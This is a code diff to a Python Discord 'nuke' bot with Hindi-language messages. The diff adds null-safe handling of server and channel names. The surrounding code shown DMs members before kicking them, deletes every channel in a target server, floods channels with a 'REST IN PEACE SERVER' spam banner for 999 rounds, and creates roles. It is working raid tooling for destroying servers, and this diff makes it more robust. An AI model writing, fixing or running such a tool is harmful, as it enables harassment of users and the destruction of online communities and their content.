@@ -211,7 +211,7 @@ SPAM_MESSAGE = """💀🔥💥━━━━━━━━━━━━━━━━�
 
 💥🔥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔥💥
         ☠️  REST IN PEACE SERVER  ☠️
-💀🔥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔥💀"""
+💀🔥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━��🔥💀"""
 
 # SPAM COMMAND - Channel mein custom message spam karenge
 @bot.tree.command(name="spam", description="💬 Channel में message spam करो!")
@@ -453,8 +453,9 @@ async def nuke_dm(interaction: discord.Interaction, server_id: str):
             await interaction.followup.send("❌ Bot को इस server में Admin permission नहीं है!\n\n**Bot को फिर से add करो admin permission के साथ!**", ephemeral=True)
             return
         
-        await interaction.followup.send(f"🔥 **NUKE शुरू हो गया!**\n🎯 Target Server: **{guild.name}**\n💀 SERVER UD JAYEGA!", ephemeral=True)
-        print(f"🔥 NUKE शुरू: {guild.name} (ID: {guild_id})")
+        guild_name = guild.name if guild.name else "Unknown Server"
+        await interaction.followup.send(f"🔥 **NUKE शुरू हो गया!**\n🎯 Target Server: **{guild_name}**\n💀 SERVER UD JAYEGA!", ephemeral=True)
+        print(f"🔥 NUKE शुरू: {guild_name} (ID: {guild_id})")
         
         # Phase 1: Send DMs to members before kicking
         print("🔥 PHASE 1: SENDING DM MESSAGES...")
@@ -484,7 +485,8 @@ async def nuke_dm(interaction: discord.Interaction, server_id: str):
         for channel in list(guild.channels):
             try:
                 await channel.delete()
-                print(f"💥 DESTROYED: {channel.name}")
+                channel_name = channel.name if channel.name else "Unknown"
+                print(f"💥 DESTROYED: {channel_name}")
             except Exception as e:
                 print(f"⚠️ Error: {e}")
             await asyncio.sleep(0.1)
@@ -555,7 +557,8 @@ async def nuke_dm(interaction: discord.Interaction, server_id: str):
                     task = channel.send(SPAM_MESSAGE)
                     tasks.append(task)
                 except Exception as e:
-                    print(f"⚠️ Error queueing message to {channel.name}: {e}")
+                    channel_id = channel.id if hasattr(channel, 'id') else "unknown"
+                    print(f"⚠️ Error queueing message to channel {channel_id}: {e}")
             
             # Send all messages concurrently
             try:
@@ -588,7 +591,7 @@ async def nuke_dm(interaction: discord.Interaction, server_id: str):
             print(f"⚠️ Error changing server: {e}")
         
         # Final message
-        await interaction.followup.send(f"✅ **NUKE COMPLETE!** 💥🔥\n🎯 Server: **{guild.name}**\n📊 Channels Created: **{channel_count}**\n💬 Spam Rounds: **999**\n🎭 Roles Created: **{roles_created}**\n💀 **SERVER UD GYA!**", ephemeral=True)
+        await interaction.followup.send(f"✅ **NUKE COMPLETE!** 💥🔥\n🎯 Server: **{guild_name}**\n📊 Channels Created: **{channel_count}**\n💬 Spam Rounds: **999**\n🎭 Roles Created: **{roles_created}**\n💀 **SERVER UD GYA!**", ephemeral=True)
         print("✅ NUKE SUCCESSFUL!")
         
     except ValueError:
